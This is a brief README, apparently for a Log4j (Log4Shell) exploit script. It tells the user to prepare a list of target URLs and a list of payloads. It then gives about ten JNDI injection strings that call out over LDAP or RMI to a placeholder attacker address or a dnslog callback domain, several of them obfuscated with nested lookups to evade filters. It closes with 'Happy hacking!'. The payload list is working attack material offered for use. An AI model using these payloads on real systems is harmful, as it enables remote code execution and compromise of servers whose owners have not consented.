# log4j
A simple script to exploit the log4j vulnerability

#Before Using the script:
1. Only versions between 2.0 - 2.14.1 are affected by the exploit
2. Create two txt files - one containing a list of URLs to test and the other containing the list of payloads.
3. Payload examples:

${jndi:ldap://[malicious ip address]/a} \
${jndi:ldap://n9iawh.dnslog.cn/} \
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//[malicious ip address]/a} \
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://[malicious ip address]/as} \
${${::-j}ndi:rmi://[malicious ip address]/a} \
${${lower:jndi}:${lower:rmi}://[malicious ip address]/poc} \
${jndi:rmi://[malicious ip address]} \
${${lower:${lower:jndi}}:${lower:rmi}://[malicious ip address]} \
${jndi:${lower:l}${lower:d}ap://[malicious ip address]/a} \
${jndi:${lower:l}${lower:d}ap://[malicious ip address]/} 

Happy hacking!
